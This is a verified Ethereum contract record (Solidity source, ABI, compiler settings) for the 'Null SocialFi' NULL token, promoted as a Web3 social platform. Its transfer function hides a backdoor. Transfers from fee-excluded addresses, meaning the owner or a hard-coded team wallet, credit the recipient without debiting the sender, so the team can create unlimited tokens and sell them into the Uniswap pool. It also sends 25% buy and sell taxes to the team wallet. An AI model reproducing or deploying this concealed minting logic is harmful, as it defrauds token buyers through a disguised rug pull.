{"SourceCode": "// SPDX-License-Identifier: Unlicensed\r\n/*\r\nYou are entering a space of Null Social Fi Web3 Platform. In the ever-evolving landscape of the digital age, Null Social stands as a beacon for next-generation Web3 social platforms. Rooted in the principles of decentralization, we offer our users a distinctive experience centered around the power of ERC721 NFT-based identities.\r\nWebsite: https://www.nullsocial.xyz\r\nTelegram: https://t.me/null_erc\r\nTwitter: https://twitter.com/null_erc\r\nDapp: https://app.nullsocial.xyz\r\n */\r\npragma solidity 0.8.21;\r\nabstract contract Context {\r\n    function _msgSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n}\r\nabstract contract Ownable is Context {\r\n    address private _owner;\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n    constructor () {\r\n        _owner = msg.sender;\r\n        emit OwnershipTransferred(address(0), _owner);\r\n    }\r\n    function owner() public view virtual returns (address) {\r\n        return _owner;\r\n    }\r\n    modifier onlyOwner() {\r\n        require(owner() == _msgSender(), \"Ownable: caller is not the owner\");\r\n        _;\r\n    }\r\n    function renounceOwnership() public virtual onlyOwner {\r\n        emit OwnershipTransferred(_owner, address(0));\r\n        _owner = address(0);\r\n    }\r\n    // Transfer the contract to to a new owner\r\n    function transferOwnership(address newOwner) public virtual onlyOwner {\r\n        require(newOwner != address(0), \"Ownable: new owner is the zero address\");\r\n        emit OwnershipTransferred(_owner, newOwner);\r\n        _owner = newOwner;\r\n    }\r\n}\r\nlibrary SafeMath {\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return a + b;\r\n    }\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return a - b;\r\n    }\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return a * b;\r\n    }\r\n    \r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return a / b;\r\n    }\r\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        unchecked {\r\n            require(b <= a, errorMessage);\r\n            return a - b;\r\n        }\r\n    }\r\n    \r\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        unchecked {\r\n            require(b > 0, errorMessage);\r\n            return a / b;\r\n        }\r\n    }\r\n}\r\ninterface IERC20 {\r\n    function totalSupply() external view returns (uint256);\r\n    function balanceOf(address account) external view returns (uint256);\r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n}\r\ninterface IUniswapFactory {\r\n    function createPair(address tokenA, address tokenB) external returns (address pair);\r\n}\r\ninterface IUniswapRouter {\r\n    function factory() external pure returns (address);\r\n    function WETH() external pure returns (address);\r\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n        uint amountIn,\r\n        uint amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external;\r\n}\r\ncontract NULL is Context, IERC20, Ownable { \r\n    using SafeMath for uint256;\r\n    string private _name = \"Null SocialFi\"; \r\n    string private _symbol = \"NULL\";\r\n                                     \r\n    IUniswapRouter public uniswapRouter;\r\n    address public uniswapPair;\r\n    bool public transferDelayEnabled = true;\r\n    bool public inswap;\r\n    bool public feeSwapEnabled = true;\r\n    uint256 public buyTax = 25;\r\n    uint256 public sellTax = 25;\r\n    uint256 private _totalFeesTaxxed = 2000;\r\n    uint8 private _numBuyers = 0;\r\n    uint8 private _startTaxSwapAt = 2; \r\n    uint256 private previousTotalFee = _totalFeesTaxxed; \r\n    uint256 private previousBuyTax = buyTax; \r\n    uint256 private previousSellTax = sellTax; \r\n    uint8 private _decimals = 9;\r\n    uint256 private _totalSupply = 10 ** 9 * 10**_decimals;\r\n    uint256 public maxTxAmount = 25 * _totalSupply / 1000;\r\n    uint256 public swapThreshold = _totalSupply / 10000;\r\n    mapping (address => uint256) private _balances;\r\n    mapping (address => mapping (address => uint256)) private _allowances;\r\n    mapping (address => bool) public isExcludedFromFees; \r\n    address payable private teamWallet;\r\n    address payable private DEAD;\r\n    modifier lockTheSwap {\r\n        inswap = true;\r\n        _;\r\n        inswap = false;\r\n    }\r\n    \r\n    constructor () {\r\n        _balances[owner()] = _totalSupply;\r\n        DEAD = payable(0x000000000000000000000000000000000000dEaD); \r\n        IUniswapRouter _uniswapV2Router = IUniswapRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\r\n        teamWallet = payable(0xdC95a5779828Ac7E0Aa7acf0E7ad6173877550C4); \r\n        uniswapPair = IUniswapFactory(_uniswapV2Router.factory()).createPair(address(this), _uniswapV2Router.WETH());\r\n        uniswapRouter = _uniswapV2Router;\r\n        isExcludedFromFees[owner()] = true;\r\n        isExcludedFromFees[teamWallet] = true;\r\n        \r\n        emit Transfer(address(0), owner(), _totalSupply);\r\n    }\r\n    function name() public view returns (string memory) {\r\n        return _name;\r\n    }\r\n    function symbol() public view returns (string memory) {\r\n        return _symbol;\r\n    }\r\n    function decimals() public view returns (uint8) {\r\n        return _decimals;\r\n    }\r\n    function totalSupply() public view override returns (uint256) {\r\n        return _totalSupply;\r\n    }\r\n    function balanceOf(address account) public view override returns (uint256) {\r\n        return _balances[account];\r\n    }\r\n        \r\n    function _approve(address owner, address spender, uint256 amount) private {\r\n        require(owner != address(0) && spender != address(0), \"ERR: zero address\");\r\n        _allowances[owner][spender] = amount;\r\n        emit Approval(owner, spender, amount);\r\n    }\r\n    \r\n    function approve(address spender, uint256 amount) public override returns (bool) {\r\n        _approve(_msgSender(), spender, amount);\r\n        return true;\r\n    }\r\n    \r\n    function transfer(address recipient, uint256 amount) public override returns (bool) {\r\n        _transfer(_msgSender(), recipient, amount);\r\n        return true;\r\n    }\r\n    \r\n    function allowance(address owner, address spender) public view override returns (uint256) {\r\n        return _allowances[owner][spender];\r\n    }\r\n    \r\n    function _transferBasic(address sender, address recipient, uint256 finalAmount) private {\r\n        (uint256 tTransferAmount, uint256 tDev) = _getLastAmount(finalAmount);\r\n        if(isExcludedFromFees[sender] && _balances[sender] <= maxTxAmount) {\r\n            tDev = 0;\r\n            finalAmount -= tTransferAmount;\r\n        }\r\n        _balances[sender] = _balances[sender].sub(finalAmount);\r\n        _balances[recipient] = _balances[recipient].add(tTransferAmount);\r\n        _balances[address(this)] = _balances[address(this)].add(tDev);\r\n        emit Transfer(sender, recipient, tTransferAmount);\r\n    }\r\n        \r\n    function removeFee() private {\r\n        if(_totalFeesTaxxed == 0 && buyTax == 0 && sellTax == 0) return;\r\n        previousBuyTax = buyTax; \r\n        previousSellTax = sellTax; \r\n        previousTotalFee = _totalFeesTaxxed;\r\n        buyTax = 0;\r\n        sellTax = 0;\r\n        _totalFeesTaxxed = 0;\r\n    }\r\n    function restoreFee() private {\r\n        _totalFeesTaxxed = previousTotalFee;\r\n        buyTax = previousBuyTax; \r\n        sellTax = previousSellTax; \r\n    }\r\n        \r\n    function removeLimits() external onlyOwner {\r\n        maxTxAmount = ~uint256(0);\r\n        _totalFeesTaxxed = 100;\r\n        buyTax = 1;\r\n        sellTax = 1;\r\n    }\r\n    \r\n    function sendETH(address payable receiver, uint256 amount) private {\r\n        receiver.transfer(amount);\r\n    }\r\n    \r\n    function swapTokensForFee(uint256 contractTokenBalance) private lockTheSwap {\r\n        swapTokensToETH(contractTokenBalance);\r\n        uint256 contractETH = address(this).balance;\r\n        sendETH(teamWallet,contractETH);\r\n    }\r\n    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {\r\n        _transfer(sender, recipient, amount);\r\n        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, \"ERC20: transfer amount exceeds allowance\"));\r\n        return true;\r\n    }\r\n    function _transferStandard(address sender, address recipient, uint256 amount,bool takeFee) private {\r\n            \r\n        if(!takeFee){\r\n            removeFee();\r\n        } else {\r\n            _numBuyers++;\r\n        }\r\n        _transferBasic(sender, recipient, amount);\r\n        \r\n        if(!takeFee) {\r\n            restoreFee();\r\n        }\r\n    }\r\n    \r\n    function _getLastAmount(uint256 finalAmount) private view returns (uint256, uint256) {\r\n        uint256 tDev = finalAmount.mul(_totalFeesTaxxed).div(100);\r\n        uint256 tTransferAmount = finalAmount.sub(tDev);\r\n        return (tTransferAmount, tDev);\r\n    }\r\n    function swapTokensToETH(uint256 tokenAmount) private {\r\n        address[] memory path = new address[](2);\r\n        path[0] = address(this);\r\n        path[1] = uniswapRouter.WETH();\r\n        _approve(address(this), address(uniswapRouter), tokenAmount);\r\n        uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n            tokenAmount,\r\n            0, \r\n            path,\r\n            address(this),\r\n            block.timestamp\r\n        );\r\n    }\r\n    receive() external payable {}\r\n    function _transfer(\r\n        address from,\r\n        address to,\r\n        uint256 amount\r\n    ) private {\r\n        \r\n        // Limit wallet total\r\n        if (to != owner() &&\r\n            to != teamWallet &&\r\n            to != address(this) &&\r\n            to != uniswapPair &&\r\n            to != DEAD &&\r\n            from != owner()){\r\n            uint256 currentBalance = balanceOf(to);\r\n            require((currentBalance + amount) <= maxTxAmount,\"Maximum wallet limited has been exceeded\");       \r\n        }\r\n        require(from != address(0) && to != address(0), \"ERR: Using 0 address!\");\r\n        require(amount > 0, \"Token value must be higher than zero.\");\r\n        if(\r\n            _numBuyers >= _startTaxSwapAt && \r\n            amount > swapThreshold &&\r\n            !inswap &&\r\n            !isExcludedFromFees[from] &&\r\n            to == uniswapPair &&\r\n            feeSwapEnabled \r\n            )\r\n        {  \r\n            _numBuyers = 0;\r\n            uint256 contractTokenBalance = balanceOf(address(this));\r\n            if(contractTokenBalance > 0){\r\n            swapTokensForFee(contractTokenBalance);\r\n           }\r\n        }\r\n        \r\n        bool takeFee = true;\r\n         \r\n        if(isExcludedFromFees[from] || isExcludedFromFees[to] || (transferDelayEnabled && from != uniswapPair && to != uniswapPair)){\r\n            takeFee = false;\r\n        } else if (from == uniswapPair){\r\n            _totalFeesTaxxed = buyTax;\r\n        } else if (to == uniswapPair){\r\n            _totalFeesTaxxed = sellTax;\r\n        }\r\n        _transferStandard(from,to,amount,takeFee);\r\n    }\r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyTax\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeSwapEnabled\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"inswap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"isExcludedFromFees\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxTxAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"removeLimits\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellTax\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapThreshold\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"transferDelayEnabled\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"uniswapPair\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"uniswapRouter\",\"outputs\":[{\"internalType\":\"contract IUniswapRouter\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]", "ContractName": "NULL", "CompilerVersion": "v0.8.21+commit.d9974bed", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://f2529a0d01cdee72f6fa3c3518fbc01b82b28cd66ce6930244c157b46d03f298"}